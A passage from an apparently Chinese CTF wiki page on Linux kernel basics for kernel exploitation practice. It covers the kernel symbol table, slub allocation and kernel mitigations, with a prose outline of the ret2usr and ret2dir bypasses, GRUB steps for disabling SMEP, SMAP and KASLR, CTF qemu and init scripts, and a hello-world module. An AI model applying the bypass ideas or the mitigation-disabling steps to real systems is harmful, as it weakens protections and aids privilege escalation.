( do_brk ); EXPORT_SYMBOL ( exit_mm ); \u2026 EXPORT_SYMBOL ( schedule ); EXPORT_SYMBOL ( jiffies ); EXPORT_SYMBOL ( xtime ); \u2026 \u8fd9\u4e9b\u7b26\u53f7\u539f\u672c\u662f\u5185\u6838\u5185\u90e8\u7684\u7b26\u53f7\uff0c\u901a\u8fc7EXPORT_SYMBOL\u8fd9\u4e2a\u5b8f\u540e\u5c31\u4f1a\u88ab\u653e\u5728\u4e00\u4e2a\u516c\u5f00\u7684\u5730\u65b9\uff0c\u4f7f\u5f97\u88c5\u5165\u5230\u5185\u6838\u4e2d\u7684\u5176\u4ed6\u6a21\u5757\u53ef\u4ee5\u5e94\u7528\u5b83\u4eec\u3002\u4ec5\u4ec5\u77e5\u9053\u7b26\u53f7\u7684\u540d\u5b57\u662f\u4e0d\u591f\u7684\uff0c\u8fd8\u9700\u8981\u77e5\u9053\u5b83\u4eec\u5728\u5185\u6838\u7a7a\u95f4\u4e2d\u7684\u5730\u5740\u624d\u6709\u610f\u4e49\u3002\u5185\u6838\u4e2d\u5b9a\u4e49\u4e86\u5982\u4e0b\u7ed3\u6784\u6765\u63cf\u8ff0\u6a21\u5757\u7684\u7b26\u53f7\uff1a struct module_symbol { unsigned long value;\uff0f*\u7b26\u53f7\u5728\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5730\u5740*/ const char *name; /*\u7b26\u53f7\u540d*/ }; /proc/ksyms\uff082.6\u4ee5\u540e\u7248\u672c\u901a\u8fc7/proc/kallsyms\uff09\u6587\u4ef6\u53ef\u4ee5\u8bfb\u51fa\u6240\u6709\u5185\u6838\u6a21\u5757export\u7684\u7b26\u53f7\uff08\u5982\u56fex.2\uff09\uff0c\u8fd9\u4e9b\u7b26\u53f7\u5c31\u5f62\u6210\u4e86\u5185\u6838\u7b26\u53f7\u8868\uff0c\u5176\u683c\u5f0f\u4e3a\uff1a \u5185\u5b58\u5730\u5740 \u7b26\u53f7\u540d \uff3b\u6240\u5c5e\u6a21\u5757\uff3d \u5728Linux\u6a21\u5757\u53d8\u6210\u4e2d\uff0c\u53ef\u4ee5\u6839\u636e\u7b26\u53f7\u540d\u76f4\u63a5\u4ece\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u68c0\u7d22\u51fa\u5176\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u7136\u540e\u76f4\u63a5\u8bbf\u95ee\u8be5\u5730\u5740\u5c31\u53ef\u4ee5\u83b7\u5f97\u5185\u6838\u6570\u636e\u3002\u5982\u679c\u7b26\u53f7\u662f\u4ece\u5185\u6838\uff08\u90a3\u4e2a\u6bcd\u6a21\u5757\uff09\u76f4\u63a5export\u7684\uff0c\u90a3\u4e48\u7b2c\u4e09\u5217\u7684\u6240\u5c5e\u6a21\u5757\u5c31\u4f1a\u4e3a\u7a7a\u3002 \u5185\u6838\u7b26\u53f7\u8868\u8bb0\u5f55\u4e86\u6240\u6709\u6a21\u5757\u53ef\u4ee5\u8bbf\u95ee\u7684\u7b26\u53f7\u53ca\u76f8\u5e94\u7684\u5730\u5740\uff0c\u5f53\u4e00\u4e2a\u65b0\u7684\u6a21\u5757\u88ab\u88c5\u5165\u5185\u6838\u540e\uff0c\u5176\u58f0\u660e\u7684\u67d0\u4e9b\u7b26\u53f7\u5c31\u4f1a\u88ab\u767b\u8bb0\u5230\u8fd9\u4e2a\u8868\u4e2d\uff0c\u5e76\u4e14\u5c31\u53ef\u80fd\u88ab\u5176\u4ed6\u6a21\u5757\u6240\u5f15\u7528\uff0c\u8fd9\u4e2a\u5c31\u662f\u6a21\u5757\u4f9d\u8d56\u3002\u6a21\u5757A\u5f15\u7528\u6a21\u5757B\u7684export\u51fa\u6765\u7b26\u53f7\uff0c\u90a3\u4e48\u5c31\u662f\u6a21\u5757B\u88ab\u6a21\u5757A\u5f15\u7528\uff0c\u6216\u8005\u8bf4\u6a21\u5757A\u4f9d\u8d56\u4e8e\u6a21\u5757B\u3002\u5982\u679c\u8981\u94fe\u63a5\u6a21\u5757A\uff0c\u5fc5\u987b\u5148\u94fe\u63a5\u6a21\u5757B\u3002 \u56e0\u4e3a\u6709\u6a21\u5757\u4f9d\u8d56\uff0c\u6240\u4ee5\u4e3a\u4e86\u786e\u4fdd\u6a21\u5757\u5b89\u5168\u5730\u5378\u8f7d\uff0c\u6bcf\u4e2a\u6a21\u5757\u90fd\u4f7f\u7528\u4e86\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u5668\u3002\u5f53\u6267\u884c\u6a21\u5757\u6240\u6d89\u53ca\u7684\u64cd\u4f5c\u65f6\u5c31\u9012\u589e\u8ba1\u6570\u5668\uff0c\u5728\u64cd\u4f5c\u7ed3\u675f\u65f6\u5c31\u9012\u51cf\u8fd9\u4e2a\u8ba1\u6570\u5668\uff1b\u53e6\u5916\uff0c\u5f53\u6a21\u5757B\u88ab\u6a21\u5757A\u5f15\u7528 \u65f6\uff0c\u6a21\u5757B\u7684\u5f15\u7528\u8ba1\u6570\u5c31\u9012\u589e\uff0c\u5f15\u7528\u7ed3\u675f\uff0c\u8ba1\u6570\u5668\u9012\u51cf\u3002\u4ec0\u4e48\u65f6\u5019\u53ef\u4ee5\u5378\u8f7d\u8fd9\u4e2a\u6a21\u5757\uff1f\u5f53\u7136\u53ea\u6709\u8fd9\u4e2a\u8ba1\u6570\u5668\u503c\u4e3a0\u7684\u65f6\u5019\u3002 \u53e6\u5916\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528nm\u6307\u4ee4\u6765\u5217\u51fako\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\uff1a \u5185\u6838\u5185\u5b58\u5206\u914d \u5185\u6838\u4e2d\u4e5f\u9700\u8981\u4f7f\u7528\u5230\u5185\u5b58\u7684\u5206\u914d\uff0c\u7c7b\u4f3c\u4e8e\u7528\u6237\u7a7a\u95f4malloc\u7684\u529f\u80fd\u3002\u5728\u5185\u6838\u4e2d\u6ca1\u6709libc\uff0c\u6240\u4ee5\u6ca1\u6709malloc\uff0c\u4f46\u662f\u9700\u8981\u8fd9\u6837\u7684\u529f\u80fd\uff0c\u6240\u4ee5\u6709kmalloc\uff0c\u5176\u5b9e\u73b0\u662f\u4f7f\u7528\u7684slab/slub\u5206\u914d\u5668\uff0c\u73b0\u5728\u591a\u89c1\u7684\u662fslub\u5206\u914d\u5668\u3002\u8fd9\u4e2a\u5206\u914d\u5668\u901a\u8fc7\u4e00\u4e2a\u591a\u7ea7\u7684\u7ed3\u6784\u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\u6709cache\u5c42\uff0ccache\u662f\u4e00\u4e2a\u7ed3\u6784\uff0c\u91cc\u8fb9\u901a\u8fc7\u4fdd\u5b58\u7a7a\u5bf9\u8c61\uff0c\u90e8\u5206\u4f7f\u7528\u7684\u5bf9\u8c61\u548c\u5b8c\u5168\u4f7f\u7528\u4e86\u5bf9\u8c61\u6765\u7ba1\u7406\uff0c\u5bf9\u8c61\u5c31\u662f\u6307\u5185\u5b58\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u5206\u914d\u6216\u8005\u5df2\u7ecf\u5206\u914d\u7684\u4e00\u90e8\u5206\u5185\u6838\u7a7a\u95f4\u3002kmalloc\u4f7f\u7528\u4e86\u591a\u4e2acache\uff0c\u4e00\u4e2acache\u5bf9\u5e94\u4e00\u4e2a2\u7684\u5e42\u5927\u5c0f\u7684\u4e00\u7ec4\u5185\u5b58\u5bf9\u8c61\u3002slab\u5206\u914d\u5668\u4e25\u683c\u6309\u7167cache\u53bb\u533a\u5206\uff0c\u4e0d\u540ccache\u7684\u65e0\u6cd5\u5206\u914d\u5728\u4e00\u9875\u5185\uff0cslub\u5206\u914d\u5668\u5219\u8f83\u4e3a\u5bbd\u677e\uff0c\u4e0d\u540ccache\u5982\u679c\u5206\u914d\u76f8\u540c\u5927\u5c0f\uff0c\u53ef\u80fd\u4f1a\u5728\u4e00\u9875\u5185\u3002 \u6f0f\u6d1e\u7f13\u51b2\u673a\u5236 Dmesg Restrictions \uff1a\u901a\u8fc7\u8bbe\u7f6e/proc/sys/kernel/dmesg_restrict\u4e3a1\uff0c\u53ef\u4ee5\u5c06dmesg\u8f93\u51fa\u7684\u4fe1\u606f\u89c6\u4e3a\u654f\u611f\u4fe1\u606f\uff08\u9ed8\u8ba4\u4e3a0\uff09\uff1b Kernel Address Display Restriction \uff1a/proc/sys/kernel/kptr_restrict\u88ab\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a1\uff0c\u5bfc\u81f4\u65e0\u6cd5\u901a\u8fc7/proc/kallsyms\u83b7\u53d6\u5185\u6838\u5730\u5740\uff0c\u5982\u4e0b\u56fe\uff1b Kernel PageTable Isolation \uff1aKPTI\uff0c\u5185\u6838\u9875\u8868\u9694\u79bb\uff0c\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u88ab\u5206\u6210\u4e86\u5185\u6838\u5730\u5740\u7a7a\u95f4\u548c\u7528\u6237\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d\u5185\u6838\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u4e86\u6574\u4e2a\u7269\u7406\u5730\u5740\u7a7a\u95f4\uff0c\u800c\u7528\u6237\u5730\u5740\u7a7a\u95f4\u53ea\u80fd\u6620\u5c04\u5230\u6307\u5b9a\u7684\u7269\u7406\u5730\u5740\u7a7a\u95f4\u3002\u5185\u6838\u5730\u5740\u7a7a\u95f4\u548c\u7528\u6237\u5730\u5740\u7a7a\u95f4\u5171\u7528\u4e00\u4e2a\u9875\u5168\u5c40\u76ee\u5f55\u8868\u3002\u4e3a\u4e86\u5f7b\u5e95\u9632\u6b62\u7528\u6237\u7a0b\u5e8f\u83b7\u53d6\u5185\u6838\u6570\u636e\uff0c\u53ef\u4ee5\u4ee4\u5185\u6838\u5730\u5740\u7a7a\u95f4\u548c\u7528\u6237\u5730\u5740\u7a7a\u95f4\u4f7f\u7528\u4e24\u7ec4\u9875\u8868\u96c6\u3002Windows\u79f0\u5176\u4e3aKVA Shadow\uff1b Kernel ASLR \uff1a\u5185\u6838\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff1b SMAP/SMEP \uff1aSMAP\uff08Supervisor Mode Access Prevention\uff0c\u7ba1\u7406\u6a21\u5f0f\u8bbf\u95ee\u4fdd\u62a4\uff09\u548cSMEP\uff08Supervisor Mode Execution Prevention\uff0c\u7ba1\u7406\u6a21\u5f0f\u6267\u884c\u4fdd\u62a4\uff09\u7684\u4f5c\u7528\u5206\u522b\u662f\u7981\u6b62\u5185\u6838\u8bbf\u95ee\u7528\u6237\u7a7a\u95f4\u7684\u6570\u636e\u548c\u7981\u6b62\u5185\u6838\u6267\u884c\u7528\u6237\u7a7a\u95f4\u7684\u4ee3\u7801\u3002arm\u91cc\u9762\u53ebPXN\uff08Privilege Execute Never\uff09\u548cPAN\uff08Privileged Access Never\uff09\u3002\u548cNX\u4e00\u6837SMAP/SMEP\u9700\u8981\u5904\u7406\u5668\u652f\u6301\uff0c\u5982\u4e0b\u56fe\uff0c\u53ef\u4ee5\u901a\u8fc7cat /proc/cpuinfo\u67e5\u770b\uff0c\u5728\u5185\u6838\u547d\u4ee4\u884c\u4e2d\u6dfb\u52a0nosmap\u548cnosmep\u7981\u7528,\u662f\u5426\u5f00\u542f\u7531CPU\u7684CR4\u5bc4\u5b58\u5668\u7ba1\u7406. \u5728\u6ca1\u6709SMAP/SMEP\u7684\u60c5\u51b5\u4e0b\u628a\u5185\u6838\u6307\u9488\u91cd\u5b9a\u5411\u5230\u7528\u6237\u7a7a\u95f4\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u88ab\u79f0\u4e3aret2usr\u3002physmap\u662f\u5185\u6838\u7ba1\u7406\u7684\u4e00\u5757\u975e\u5e38\u5927\u7684\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\uff0c\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u8be5\u7a7a\u95f4\u5730\u5740\u548cRAM\u5730\u5740\u76f4\u63a5\u6620\u5c04\u3002RAM\u76f8\u5bf9physmap\u8981\u5c0f\u5f97\u591a\uff0c\u5bfc\u81f4\u4e86\u4efb\u4f55\u4e00\u4e2aRAM\u5730\u5740\u90fd\u53ef\u4ee5\u5728physmap\u4e2d\u627e\u5230\u5176\u5bf9\u5e94\u7684\u865a\u62df\u5185\u5b58\u5730\u5740\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u77e5\u9053\u7528\u6237\u7a7a\u95f4\u7684\u865a\u62df\u5185\u5b58\u4e5f\u4f1a\u6620\u5c04\u5230RAM\u3002\u8fd9\u5c31\u5b58\u5728\u4e24\u4e2a\u865a\u62df\u5185\u5b58\u5730\u5740\uff08\u4e00\u4e2a\u5728physmap\u5730\u5740\uff0c\u4e00\u4e2a\u5728\u7528\u6237\u7a7a\u95f4\u5730\u5740\uff09\u6620\u5c04\u5230\u540c\u4e00\u4e2aRAM\u5730\u5740\u7684\u60c5\u51b5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5728\u7528\u6237\u7a7a\u95f4\u91cc\u521b\u5efa\u7684\u6570\u636e\uff0c\u4ee3\u7801\u5f88\u6709\u53ef\u80fd\u6620\u5c04\u5230physmap\u7a7a\u95f4\u3002\u57fa\u4e8e\u8fd9\u4e2a\u7406\u8bba\u5728\u7528\u6237\u7a7a\u95f4\u7528mmap()\u628a\u63d0\u6743\u4ee3\u7801\u6620\u5c04\u5230\u5185\u5b58\uff0c\u7136\u540e\u518d\u5728physmap\u91cc\u627e\u5230\u5176\u5bf9\u5e94\u7684\u526f\u672c\uff0c\u4fee\u6539EIP\u8df3\u5230\u526f\u672c\u6267\u884c\u5c31\u53ef\u4ee5\u4e86\u3002\u56e0\u4e3aphysmap\u672c\u8eab\u5c31\u662f\u5728\u5185\u6838\u7a7a\u95f4\u91cc\uff0c\u6240\u4ee5SMAP/SMEP\u90fd\u4e0d\u4f1a\u53d1\u6325\u4f5c\u7528\u3002\u8fd9\u79cd\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u53ebret2dir\u3002\u5173\u95edSMEP\u65b9\u6cd5\u4fee\u6539 /etc/default/grub \u6587\u4ef6\u4e2d\u7684GRUB_CMDLINE_LINUX=\"\"\uff0c\u52a0\u4e0anosmep/nosmap/nokaslr\uff0c\u7136\u540e update-grub \u5c31\u597d; Stack Protector \uff1a\u548c\u7528\u6237\u6001\u76f8\u540c\uff0ccanary\uff1b Address Protection \uff1a\u5185\u6838\u7a7a\u95f4\u548c\u7528\u6237\u7a7a\u95f4\u5171\u4eab\u865a\u62df\u5185\u5b58\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u9632\u6b62\u7528\u6237\u7a7a\u95f4mmap\u7684\u5185\u5b58\u4ece0\u5f00\u59cb\uff0c\u4ece\u800c\u7f13\u89e3\u7a7a\u6307\u9488\u5f15\u7528\u653b\u51fb\u3002windows\u7cfb\u7edf\u4ecewin8\u5f00\u59cb\u7981\u6b62\u5728\u96f6\u9875\u5206\u914d\u5185\u5b58\u3002\u4ecelinux\u5185\u68382.6.22\u5f00\u59cb\u53ef\u4ee5\u4f7f\u7528sysctl\u8bbe\u7f6emmap_min_addr\u6765\u5b9e\u73b0\u8fd9\u4e00\u4fdd\u62a4\u3002 CTF\u4e2d\u7684Linux Kernel\u9898\u76ee CTF\u4e2d\u7684Linux Kernel\u9898\u76ee\u4f1a\u4f7f\u7528qemu\u542f\u52a8\uff0c\u901a\u5e38\u6765\u8bf4\u4f1a\u7ed9\u4ee5\u4e0b\u4e09\u4e2a\u6587\u4ef6\uff1a 1. boot.sh\uff1a\u542f\u52a8kernel\u7684shell\u811a\u672c\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u542f\u52a8\u53c2\u6570\u7684\u503c\u770b\u51fa\u4e0d\u540c\u7684\u4fdd\u62a4\u63aa\u65bd\uff1b 2. bzImage\uff1a\u5185\u6838\u7684binary\uff1b 3. rootfs.cpio\uff1a\u542f\u52a8\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u901a\u5e38\u4f1a\u5728\u91cc\u9762\u653e\u7f6e\u4e00\u4e2a\u5047\u7684flag\uff0c\u53ef\u4ee5\u901a\u8fc7cpio\u8fdb\u884c\u89e3\u538b\uff08cpio -idmv rootfs.cpio\uff09\u3002 \u4e5f\u6709\u53ef\u80fd\u4f1a\u7ed9\u5185\u6838\u7684\u6e90\u7801\u548cko\u6587\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\u7ed9ko\u6587\u4ef6\uff0c\u90a3\u53ef\u4ee5\u901a\u8fc7\u89e3cpio\u6587\u4ef6\u5f97\u5230ko\u6587\u4ef6\u3002 \u7136\u540e\u9700\u8981\u4e86\u89e3\u7684\u5c31\u662fqemu\u7684\u542f\u52a8\u53c2\u6570\uff1a #!/bin/sh cd /home/gnote stty intr ^ ] exec timeout 120 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append loglevel=3 console=ttyS0 oops=panic panic=1 kaslr -nographic -net user -net nic -device e1000 -smp cores = 2 ,threads = 2 -cpu kvm64,+smep -monitor /dev/null 2 /dev/null \u5176\u4ed6\u53c2\u6570\u90fd\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u8fd9\u91cc\u6709\u51e0\u4e2a\u53c2\u6570\u9700\u8981\u683c\u5916\u6ce8\u610f\uff1a -append \"loglevel=3 console=ttyS0 oops=panic panic=1 kaslr\"\uff1a\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u4e86kaslr\uff1b -smp cores=2,threads=2\uff1a\u8fd9\u4e2a\u53c2\u6570\u5236\u5b9a\u4e86\u6838\u6570\uff1b -cpu kvm64,+smep\uff1a\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u4e86kvm\uff0c\u5e76\u4e14\u5f00\u542f\u4e86smep\uff1b -m 64M\uff1a\u8fd9\u4e2a\u53c2\u6570\u8bbe\u7f6e\u4e86\u865a\u62dfRAM\u7684\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a128M\uff1b -monitor /dev/null 2 /dev/null\uff1a\u8fd9\u4e2a\u53c2\u6570\u5173\u95ed\u4e86qemu\u7684monitor\u6a21\u5f0f\uff0c\u5982\u679c\u6ca1\u6709\u5173\u95ed\u7684\u8bdd\uff0c\u6211\u4eec\u662f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7qemu\u7684monitor\u6a21\u5f0f\u5f97\u5230flag\u7684\uff0c\u8fd9\u4e2a\u7ecf\u5e38\u4f1a\u6709CTF\u51fa\u9898\u8005\u56e0\u4e3a\u6ca1\u6709\u6ce8\u610f\u800c\u5bfc\u81f4\u975e\u9884\u671f\u89e3\u3002 \u8fd8\u6709\u4e00\u4e2a\u8f83\u4e3a\u6709\u7528\u7684\u6587\u4ef6\u662fcpio\u4e2d\u7684init\u6587\u4ef6\uff1a #!/bin/sh /bin/mount -t devtmpfs devtmpfs /dev chown root:tty /dev/console chown root:tty /dev/ptmx chown root:tty /dev/tty mkdir -p /dev/pts mount -vt devpts -o gid = 4 ,mode = 620 none /dev/pts mount -t proc proc /proc mount -t sysfs sysfs /sys echo 2 /proc/sys/kernel/kptr_restrict echo 1 /proc/sys/kernel/dmesg_restrict #echo 0 /proc/sys/kernel/kptr_restrict #echo 0 /proc/sys/kernel/dmesg_restrict ifup eth0 /dev/null 2 /dev/null insmod gnote.ko \u2026\u2026 init\u6587\u4ef6\u4e2d\u6709\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230\u5f00\u4e86\u54ea\u4e9b\u5185\u6838\u4fdd\u62a4\u63aa\u65bd\u4ee5\u53ca\u9898\u76ee\u505a\u7684\u4e00\u4e9b\u5947\u602a\u7684\u64cd\u4f5c\u3002 \u7f16\u5199\u548c\u5206\u6790\u4e00\u4e2aKernel\u7a0b\u5e8f \u672c\u8282\u6211\u4eec\u5c1d\u8bd5\u7f16\u5199\u4e00\u4e2aKernel\u7a0b\u5e8f\u5e76\u5728Linux\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7136\u540e\u5206\u6790\u4e00\u4e0b\u6e90\u7801\u5e76\u8fdb\u884c\u9006\u5411\u3002\u9996\u5148\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684Kernel\u7a0b\u5e8f\uff1a #include linux/module.h #include linux/kernel.h #include linux/init.h static int __init lkp_init ( void ) { printk ( Hello,World! \\n ); return 0 ; } static void __exit lkp_cleanup ( void ) { printk ( Goodbye, World! \\n ); } module_init ( lkp_init ); module_exit ( lkp_cleanup ); \u9996\u5148\u5bf9\u7a0b\u5e8f\u6e90\u7801\u8fdb\u884c\u5206\u6790\uff0c\u9996\u5148\u662f\u5934\u6587\u4ef6\uff0clinux/module.h\u662fLinux\u5185\u6838\u6a21\u5757\u53d8\u6210\u5fc5\u987b\u5305\u542b\u7684\u5934\u6587\u4ef6\uff0c\u5934\u6587\u4ef6kernel.h\u5305\u542b\u4e86\u5e38\u7528\u7684\u5185\u6838\u51fd\u6570\uff0c\u5934\u6587\u4ef6init.h\u5305\u542b\u4e86\u5b8f_init\u548c_exit\uff0c\u5b83\u4eec\u5141\u8bb8\u91ca\u653e\u5185\u6838\u5360\u7528\u7684\u5185\u5b58\u3002\u63a5\u4e0b\u6765\u662flkp_init\u51fd\u6570\uff0c\u8fd9\u4e2a\u662f\u6a21\u5757\u7684\u521d\u59cb\u5316\u51fd\u6570\uff0c\u5b83\u4f1a\u5728\u5185\u6838\u6a21\u5757\u88ab\u52a0\u8f7d\u7684\u65f6\u5019\u6267\u884c\uff0c\u4f7f\u7528__init\u8fdb\u884c\u4fee\u9970\uff0c\u4e00\u822c\u7528\u5b83\u6765\u521d\u59cb\u5316\u6570\u636e\u7ed3\u6784\u7b49\u5185\u5bb9\uff1blkp_cleanup\u51fd\u6570\u662f\u6a21\u5757\u7684\u9000\u51fa\u51fd\u6570\uff0c\u4ed6\u4f1a\u5728\u6a21\u5757\u5728\u9000\u51fa\u7684\u65f6\u5019\u6267\u884c\u3002\u51fd\u6570module_init()\u548ccleanup_exit()\u662f\u6a21\u5757\u7f16\u7a0b\u4e2d\u6700\u57fa\u672c\u4e5f\u662f\u5fc5\u987b\u7684\u4e24\u4e2a\u51fd\u6570\uff0c\u5b83\u7528\u6765\u6307\u5b9a\u6a21\u5757\u52a0\u8f7d\u548c\u9000\u51fa\u65f6\u8c03\u7528\u7684\u51fd\u6570\uff0c\u8fd9\u91cc\u52a0\u8f7d\u7684\u662f\u6211\u4eec\u4e0a\u9762\u5b9a\u4e49\u597d\u7684\u4e24\u4e2a\u51fd\u6570\u3002\u4e0a\u8ff0\u4e24\u4e2a\u51fd\u6570\u5fc5\u987b\u5728\u5185\u6838\u6a21\u5757\u4e2d\u5305\u542b\uff0cmodule_init()\u5411\u5185\u6838\u6ce8\u518c\u6a21\u5757\u6240\u63d0\u4f9b\u7684\u65b0\u529f\u80fd\uff0c\u800ccleanup_exit()\u6ce8\u9500\u7531\u6a21\u5757\u63d0\u4f9b\u7684\u6240\u6709\u529f\u80fd\u3002\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86printk\u51fd\u6570\uff0c\u8fd9\u662f\u5185\u6838\u7684\u6253\u5370\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528dmesg\u6307\u4ee4\u770b\u5230\u5185\u6838\u6253\u5370\u7684\u4fe1\u606f\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u7f16\u8bd1\u8fd9\u6bb5\u4ee3\u7801\uff0c\u9996\u5148\u6211\u4eec\u8981\u5236\u4f5c\u4e00\u4e2aMakefile\u6587\u4ef6\uff1a KERNAL_DIR ? = /lib/modules/ $( shell uname -r ) /build PWD : = $( shell pwd ) obj-m : = c1.o modules: $( MAKE ) -C $( KERNAL_DIR ) M = $( PWD ) modules @make clear clear: @rm -f *.o *.cmd *.mod.c @rm -rf *~ core .depend .tmp_versions Module.symvers modules.order -f @rm -f .*ko.cmd .*.o.cmd .*.o.d @rm -f *.unsigned clean: @rm -f c1.ko \u628a\u5185\u6838\u6a21\u5757\u7684\u4ee3\u7801\u653e\u7f6e\u5728c1.c\u4e2d\uff0c\u7136\u540emake\uff0c\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230ko\u6587\u4ef6\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5dmesg\u67e5\u770bLinux\u5185\u6838\u7684\u6253\u5370\u4fe1\u606f\uff0cdmesg -c\u5c06\u4f1a\u6e05\u9664\u4e4b\u524dLinux\u5185\u6838\u7684\u6253\u5370\u4fe1\u606f\u3002\u5982\u56fe\u4e0b\u6240\u793a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528insmod\u5b89\u88c5\u6a21\u5757\uff0c\u7136\u540e\u4f7f\u7528dmesg\u67e5\u770b\u5185\u6838\u6253\u5370\u7684\u4fe1\u606f\uff1b\u7136\u540e\u4f7f\u7528lsmod\u53ef\u4ee5\u770b\u5230\u5185\u6838\u5b89\u88c5\u7684\u6a21\u5757\uff1b\u6700\u540e\u4f7f\u7528rmmod\u5378\u8f7d\u6a21\u5757\uff0c\u7136\u540e\u518d\u6b21\u4f7f\u7528dmesg\u67e5\u770b\u5185\u6838\u6253\u5370\u7684\u4fe1\u606f\u3002 \u5bf9\u7f16\u8bd1\u597d\u7684ko\u6587\u4ef6\u8fdb\u884c\u9006\u5411\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u53ea\u6709\u7b80\u5355\u76844\u4e2a\u51fd\u6570\uff0cinit\u51fd\u6570\u4e2d\u9996\u5148\u6267\u884c\u4e86\u4e00\u4e2afunction entry\uff08\u7528\u6765\u505afunction tracing\u7684\uff0c\u63d2\u6869\uff09\uff0c\u7136\u540e\u5c31\u662fprintk\uff1bexit\u51fd\u6570\u4e2d\u53ea\u6267\u884c\u4e86printk\u3002 \u4e0a\u8ff0\u7684\u4ee3\u7801: https://github.com/beafb1b1/challenges/tree/master/kernelstudy Reference https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/kernel/ref/13_lecture.pdf https://ctf-wiki.github.io/ctf-wiki/ https://www.kernel.org/doc/html/latest/core-api/kernel-api.html https://zh.wikipedia.org/wiki/\u5185\u6838 http://www.freebuf.com/articles/system/54263.html https://blog.csdn.net/qq_16124631/article/details/28921361 https://blog.csdn.net/zqixiao_09/article/details/50839042 https://yq.aliyun.com/articles/53679","title":"linux\u5185\u6838\u57fa\u7840"},{"location":"kernel/linux_kernel_base/#linux","text":"Linux\u4f5c\u4e3a\u4e00\u79cd\u5f00\u6e90\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5176\u5185\u6838\uff08Linux Kernel\uff0c\u540e\u7eed\u79f0\u5176\u4e3aKernel\uff09\u7531C\u8bed\u8a00\u7f16\u5199\u3002\u4f5c\u4e3a\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\uff0c\u5176\u5177\u5907\u4e86\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u5e94\u8be5\u5177\u5907\u7684\u6240\u6709\u529f\u80fd\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0cKernel\u8d77\u5230\u4e86\u627f\u4e0a\u542f\u4e0b\u7684\u4f5c\u7528\uff0c\u4e00\u65b9\u9762\u80fd\u591f\u63a7\u5236\u5e76\u4e0e\u786c\u4ef6\u8fdb\u884c\u4ea4\u4e92\uff0c\u53e6\u4e00\u65b9\u9762\u5411\u5e94\u7528\u5c42\u63d0\u4f9b\u4e86\u8fd0\u884c\u73af\u5883\u3002\u901a\u8fc7\u5185\u6838\u53ef\u4ee5\u5b9e\u73b0I/O\uff0c\u6743\u9650\u63a7\u5236\uff0c\u7cfb\u7edf\u8c03\u7528\uff0c\u8fdb\u7a0b\u7ba1\u7406\uff0c\u5185\u5b58\u7ba1\u7406\u7b49\u591a\u9879\u529f\u80fd\u3002\u4e00\u65e6Kernel\u51fa\u73b0\u4e86\u6f0f\u6d1e\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u672c\u8eab\u4ea7\u751f\u7834\u574f\uff0c\u901a\u5e38\u4f1a\u5f15\u8d77\u91cd\u542f\u3002\u5185\u6838\u6f0f\u6d1e\u6700\u5e38\u7528\u4e8e\u6743\u9650\u63d0\u5347\u3002 \u5185\u6838\u548c\u7528\u6237\u7a7a\u95f4\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u4e0d\u540c\u7684\u4fdd\u62a4\u5730\u5740\u7a7a\u95f4\u3002\u6bcf\u4e2a\u7528\u6237\u7a7a\u95f4\u7684\u8fdb\u7a0b\u90fd\u4f7f\u7528\u81ea\u5df1\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u800c\u5185\u6838\u5219\u5360\u7528\u5355\u72ec\u7684\u5730\u5740\u7a7a\u95f4\u3002Intel CPU\u628aCPU\u7684\u7279\u6743\u7ea7\u5206\u4e3aRing 0\uff0cRing 1\uff0cRing 2\uff0cRing3\u56db\u79cd\uff0c\u5176\u4e2dRing 